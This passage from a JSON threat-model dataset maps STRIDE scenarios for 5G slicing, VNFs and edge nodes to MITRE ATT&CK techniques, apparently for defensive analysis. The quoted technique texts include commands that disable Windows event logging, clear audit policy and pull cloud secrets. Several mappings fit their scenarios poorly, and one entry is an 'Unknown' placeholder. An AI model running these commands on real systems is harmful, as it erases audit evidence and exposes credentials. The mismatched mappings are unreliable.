support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actors impersonate a legitimate user plane function to intercept data.",
            "Assumptions": [
                {
                    "Assumption": "Compromise of user credentials or session tokens.",
                    "Role": "Attacker",
                    "Condition": "Successful social engineering or exploitation of software vulnerabilities."
                },
                {
                    "Assumption": "User plane functions lack secure channels for communication.",
                    "Role": "System Architect",
                    "Condition": "Insufficient encryption implementations."
                },
                {
                    "Assumption": "Absence of multi-factor authentication mechanisms.",
                    "Role": "Security Engineer",
                    "Condition": "Outdated or inadequate security policies."
                }
            ],
            "Potential Impact": "Data confidentiality breach and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user plane",
                "intercept",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers spoof external interfaces to launch Distributed Denial of Service (DDoS) attacks.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are exposed to the internet.",
                    "Role": "Network Administrator",
                    "Condition": "Internet-facing application setup."
                },
                {
                    "Assumption": "Inadequate rate limiting on external interfaces.",
                    "Role": "System Engineer",
                    "Condition": "Nonexistent or improperly configured DDoS protection mechanisms."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch large-scale DDoS attacks.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other attack networks."
                }
            ],
            "Potential Impact": "Service unavailability and potential financial loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "DDoS",
                "external interface",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Reflection Amplification",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
                "id": "attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01",
                "technique_id": "T1498.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to VNFs and manipulates data processing.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls to VNFs.",
                    "Role": "Network Administrator",
                    "Condition": "Improperly managed access permissions."
                },
                {
                    "Assumption": "Insufficient security patching and updates for VNFs.",
                    "Role": "System Administrator",
                    "Condition": "Outdated software and vulnerability exposure."
                },
                {
                    "Assumption": "Unencrypted and unaudited changes in VNFs.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of logging and encryption policies."
                }
            ],
            "Potential Impact": "Compromised data integrity and unauthorized data alterations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "access controls",
                "encryption"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Manipulating orchestration and management processes to alter resource allocations.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification mechanisms for orchestration commands.",
                    "Role": "System Designer",
                    "Condition": "Nonexistent or weak command validation processes."
                },
                {
                    "Assumption": "Exploitable vulnerabilities in NFVO.",
                    "Role": "Attacker",
                    "Condition": "Known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "Lack of comprehensive monitoring of orchestration activities.",
                    "Role": "Network Operator",
                    "Condition": "Insufficient logging and monitoring systems."
                }
            ],
            "Potential Impact": "Disruption of network slice services and potential outage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "resource allocation",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker tampers with edge computing nodes to inject malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Exposed vulnerabilities in edge node software.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or unpatched edge node systems."
                },
                {
                    "Assumption": "Lack of code integrity checks on edge nodes.",
                    "Role": "Security Architect",
                    "Condition": "Missing or weak code verification processes."
                },
                {
                    "Assumption": "Insufficient network segmentation for edge nodes.",
                    "Role": "Network Designer",
                    "Condition": "Inadequate network isolation and defense-in-depth strategies."
                }
            ],
            "Potential Impact": "Injection of malware leading to compromised data and system integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "edge computing",
                "malware injection",
                "network segmentation"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny initiating or participating in specific actions within network management systems.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and audit trails.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of detailed event logging."
                },
                {
                    "Assumption": "Absence of secure timestamping mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Weak or missing timestamp validation."
                },
                {
                    "Assumption": "Inadequate user authentication and session management.",
                    "Role": "Network Administrator",
                    "Condition": "Weak session management policies."
                }
            ],
            "Potential Impact": "Lack of accountability and potential unauthorized changes going undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trails",
                "session management"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators deny unauthorized changes to NF configurations.",
            "Assumptions": [
                {
                    "Assumption": "Weak or nonexistent access control policies.",
                    "Role": "Security Architect",
                    "Condition": "Improperly managed access permissions."
                },
                {
                    "Assumption": "Insufficient audit logging for configuration changes.",
                    "Role": "System Engineer",
                    "Condition": "Lack of detailed and immutable logs."
                },
                {
                    "Assumption": "No multi-factor authentication for critical changes.",
                    "Role": "Security Engineer",
                    "Condition": "Outdated or weak security policies."
                }
            ],
            "Potential Impact": "Compromised change management and potential operational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration changes",
                "audit logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Service providers deny sending or receiving specific data through external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Lack of detailed network traffic logs.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient logging capabilities."
                },
                {
                    "Assumption": "No secure methods for verifying data transfers.",
                    "Role": "Security Architect",
                    "Condition": "Weak data integrity checks."
                },
                {
                    "Assumption": "Absence of digital signatures for critical data exchanges.",
                    "Role": "System Designer",
                    "Condition": "Nonexistent integrity validation mechanisms."
                }
            ],
            "Potential Impact": "Disputes over data transactions and potential legal implications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data transfers",
                "network traffic",
                "digital signatures"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data leakage via exposed debug or management interfaces in VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Debug or management interfaces are not properly secured.",
                    "Role": "Network Administrator",
                    "Condition": "Improper configuration management."
                },
                {
                    "Assumption": "Sensitive data being processed without encryption.",
                    "Role": "Security Engineer",
                    "Condition": "Unencrypted data handling during processing."
                },
                {
                    "Assumption": "Attacker has access to internal network segments.",
                    "Role": "Attacker",
                    "Condition": "Internal network compromise or lateral movement."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "debug interface",
                "management interface",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of data between edge computing nodes and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "Security Architect",
                    "Condition": "Weak or nonexistent transport encryption."
                },
                {
                    "Assumption": "Exposed communication channels susceptible to interception.",
                    "Role": "Network Engineer",
                    "Condition": "Improperly secured communication links."
                },
                {
                    "Assumption": "Insufficient access controls on intermediate nodes.",
                    "Role": "System Administrator",
                    "Condition": "Weak access management practices."
                }
            ],
            "Potential Impact": "Compromised data confidentiality and potential loss of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "edge computing",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Cloud Secrets Management Stores",
                "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
                "id": "attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561",
                "technique_id": "T1555.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data stored in VNFs due to poor access controls.",
            "Assumptions": [
                {
                    "Assumption": "Improperly managed access control policies.",
                    "Role": "Network Administrator",
                    "Condition": "Weak access management framework."
                },
                {
                    "Assumption": "Unencrypted data storage within VNFs.",
                    "Role": "System Engineer",
                    "Condition": "Lack of encryption for stored data."
                },
                {
                    "Assumption": "Exposed VNFs to unauthorized internal or external access.",
                    "Role": "Security Architect",
                    "Condition": "Inadequate network segmentation and defense-in-depth strategies."
                }
            ],
            "Potential Impact": "Exposure of sensitive data to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access controls",
                "data storage",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targeting network slicing orchestration components, disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration components have exposed interfaces.",
                    "Role": "Network Administrator",
                    "Condition": "Internet-facing services with weak protections."
                },
                {
                    "Assumption": "Inadequate rate limiting on orchestration interfaces.",
                    "Role": "System Engineer",
                    "Condition": "Nonexistent or improper DDoS mitigation measures."
                },
                {
                    "Assumption": "Attacker has sufficient resources to launch a large-scale attack.",
                    "Role": "Attacker",
                    "Condition": "Access to compromised devices or botnets."
                }
            ],
            "Potential Impact": "Temporary disruption of network services and potential degradation in service quality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "orchestration",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actor floods edge computing nodes with traffic, impairing latency-sensitive services.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are improperly secured from flood attacks.",
                    "Role": "Security Architect",
                    "Condition": "Lack of flood protection mechanisms."
                },
                {
                    "Assumption": "Edge computing nodes handle critical and latency-sensitive operations.",
                    "Role": "System Designer",
                    "Condition": "Essential services reliant on edge computing."
                },
                {
                    "Assumption": "Attacker has sufficient bandwidth to overwhelm edge nodes.",
                    "Role": "Attacker",
                    "Condition": "High bandwidth resources available for attack."
                }
            ],
            "Potential Impact": "Service degradation and unavailability, particularly for latency-sensitive applications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flood attack",
                "edge computing",
                "latency-sensitive"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeted attack on VNFs causing resource exhaustion and service unavailability.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have resource management vulnerabilities.",
                    "Role": "System Engineer",
                    "Condition": "Improper resource allocation and management."
                },
                {
                    "Assumption": "Inadequate monitoring and resource utilization tracking.",
                    "Role": "Network Operator",
                    "Condition": "Lack of comprehensive monitoring tools."
                },
                {
                    "Assumption": "Sufficient attack surface due to exposed interfaces.",
                    "Role": "Attacker",
                    "Condition": "Known vulnerability points in VNF interfaces."
                }
            ],
            "Potential Impact": "Service unavailability and potential financial and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "VNF",
                "service unavailability"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in NFVO to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "NFVO software contains unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Failure to apply security patches and updates."
                },
                {
                    "Assumption": "Insufficient segregation of duties within administrative roles.",
                    "Role": "Network Administrator",
                    "Condition": "Weak role-based access control policies."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for administrative access.",
                    "Role": "Security Engineer",
                    "Condition": "Outdated or weak authentication mechanisms."
                }
            ],
            "Potential Impact": "Complete control over network orchestration and potential for widespread network disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "NFVO",
                "administrative access",
                "segregation of duties"
            ],
            "mitre_technique": {
